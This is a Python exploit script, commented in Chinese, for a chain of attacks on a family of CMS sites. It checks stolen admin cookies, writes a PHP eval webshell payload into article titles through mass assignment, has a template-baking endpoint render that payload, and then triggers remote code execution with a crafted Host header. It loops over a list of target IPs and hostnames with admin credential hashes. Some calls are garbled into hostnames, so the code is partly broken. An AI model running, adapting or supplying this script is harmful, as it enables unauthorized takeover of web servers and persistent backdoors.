#!/usr/bin/env python3
# 全站群通用链：后台凭据 → article.title 写入 payload → get_html1 烘焙模板 → RCE
# 依赖：requests；必须逐请求带正确 Host（该族节点多为 vhost 隔离，Host 不对返回 503/530/529）
import requests, time, hashlib
PX = {"http": None, "https": None}          # 本机系统代理会干扰，全部绕开
UA = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"

def exploit(ip, scheme, host, admin_user, admin_hash, payload="<php>@eval($_POST[1]);</php>"):
    BASE = "%s://%s" % (scheme, ip)
    H = {"Host": host, "User-Agent": UA}
    CK = {"admin_user": admin_user, "admin_id": admin_hash}
    S = requests.Session(); S.trust_env = False

    # 0) 凭据 oracle：Home/Article::_initialize() 无 Host 校验，失败恒定 200/3B "502"
    r = S.get(BASE + "/example.com?g=Home&m=Article&a=edit_cont&id=5", headers=H, cookies=CK,
              timeout=25, verify=False, allow_redirects=False, proxies=PX)
    if len(r.content) <= 10:
        print("[-] 凭据无效（仍是 502）"); return None
    print("[+] 凭据有效，后台会话建立  len=%d" % len(r.content))

    # 1) mass assignment 写 article.title（$arr=$_POST; add($arr)）
    #    不传 id => add() 新增；topublic=1 使文章进入 List 页 cont2 渲染集（$jq: stop=0 AND topublic=1）
    #    title 在渲染点 {$id5['title']|htmlspecialchars_decode} 会被 htmlspecialchars_decode 还原
    data = {"title": payload, "cid": "5102", "cont": "x", "cont1": "x", "stop": "0",
            "topublic": "1", "status": "1", "cyid": "0", "sort": "99999"}
    r2 = target8.example.com(BASE + "/example.com?g=Home&m=Article&a=edit_cont",
                headers=dict(H, **{"Referer": BASE + "/"}), cookies=CK, data=data,
                timeout=30, verify=False, allow_redirects=False, proxies=PX)
    print("[+] 写入 article.title ->", r2.text[:120])

    # 2) oracle：List 页必须【原样】出现 payload（不能是 &lt;php&gt;）
    g = S.get(BASE + "/example.com?g=Home&m=List&a=index&type=0", headers=H, timeout=30,
              verify=False, allow_redirects=False, proxies=PX).text
    if "<php>@eval" not in g:
        print("[-] List 页未原样渲染 payload（检查渲染点是否带 |htmlspecialchars_decode）"); return None
    print("[+] List 页已原样渲染 payload")

    # 3) 零凭证烘焙模板：抓取 http://vggc.<cfg_siteurl3>/List/index/type/0（*.target395.example.com 自指解析=抓自己）
    r3 = S.get(BASE + "/example.com?g=Home&m=Order&a=get_html1", headers=H, timeout=45,
               verify=False, allow_redirects=False, proxies=PX)
    print("[+] get_html1 ->", r3.text[:80])

    # 4) 用「第三者 Host」触发：Home/Index::index() 里
    #    Host 含 'sp' → display('indexapp')；含 'example' → display('indexalert')；否则 display() = 被覆盖的模板
    r4 = target8.example.com(BASE + "/example.com", headers=dict(H, **{"Content-Type": "application/x-www-form-urlencoded"}),
                data={"1": "echo 'RCE_'.md5('ok').'_END';"}, timeout=45, verify=False,
                allow_redirects=False, proxies=PX)
    return r4.text if "RCE_" in r4.text else None

if __name__ == "__main__":
    # 实测有效的跨节点凭据对（176 admin 表 → 78/84/131/7/160）
    JOBS = [
        ("203.0.113.7",  "http", "target401.example.com", "the",   "e8a3d8da126fbe80564309f709a539f2"),
        ("203.0.113.8",  "http", "target402.example.com",  "admin", "776bdea736fdc83d433a624dcb688656"),
        ("203.0.113.102",  "http", "target403.example.com",   "admin", "776bdea736fdc83d433a624dcb688656"),
        ("203.0.113.103",    "http", "target404.example.com",   "admin", "776bdea736fdc83d433a624dcb688656"),
        ("203.0.113.90", "https","target405.example.com",   "admin", "776bdea736fdc83d433a624dcb688656"),
    ]
    for job in JOBS:
        print("=== %s ===" % job[0])
        try:
            print(exploit(*job) and "★RCE OK")
        except Exception as e:
            print("ERR", type(e).__name__, e)
        time.sleep(3)
